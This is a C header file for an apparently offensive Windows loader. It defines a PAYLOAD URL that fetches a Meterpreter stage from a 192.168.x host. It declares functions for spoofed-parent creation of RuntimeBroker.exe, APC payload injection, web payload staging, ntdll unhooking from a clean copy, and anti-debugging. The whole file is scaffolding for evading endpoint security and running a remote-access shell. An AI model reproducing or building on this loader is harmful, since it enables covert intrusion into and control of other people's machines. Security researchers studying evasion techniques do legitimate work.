#pragma once
#include <Windows.h>
#include <WinInet.h>
#pragma comment (lib, "Wininet.lib")
#include "SysWhispers.h"

#define FLG_HEAP_ENABLE_TAIL_CHECK   0x10
#define FLG_HEAP_ENABLE_FREE_CHECK   0x20
#define FLG_HEAP_VALIDATE_PARAMETERS 0x40

#define NTDLL_URL	L"https://msdl.microsoft.com/download/symbols/ntdll.dll/"

#define TARGET_PROCESS		L"\\??\\C:\\Windows\\System32\\RuntimeBroker.exe"
#define PROCESS_PARMS		L"C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"
#define PROCESS_PATH		L"C:\\Windows\\System32"
#define PAYLOAD				L"http://192.168.15.19:8000/meterpreter"

VOID _RtlInitUnicodeString(OUT PUNICODE_STRING PusStruct, IN OPTIONAL PCWSTR Buffer);

BOOL CreateRuntimeBrokerProcess(IN PWSTR szTargetProcess, IN PWSTR szTargetProcessParameters, IN PWSTR szTargetProcessPath, IN HANDLE hParentProcess, OUT PHANDLE hProcess, OUT PHANDLE hThread);

BOOL GetProcessHandle(IN LPCWSTR szProcName, OUT DWORD* pdwPid, OUT HANDLE* phProcess);

BOOL ApcPayloadInjection(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pPayload, IN SIZE_T sPayloadSize);

BOOL PayloadStagingFromWeb(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize);

PVOID GetLocalNtdllBaseAddress();

BOOL ReadNtdllFromWinbindex(OUT PVOID* ppNtdllBuf);

BOOL ReplaceNtdllTextSection(IN PVOID pUnhookedNtdll);

BOOL IsDebuggerPresentRpl();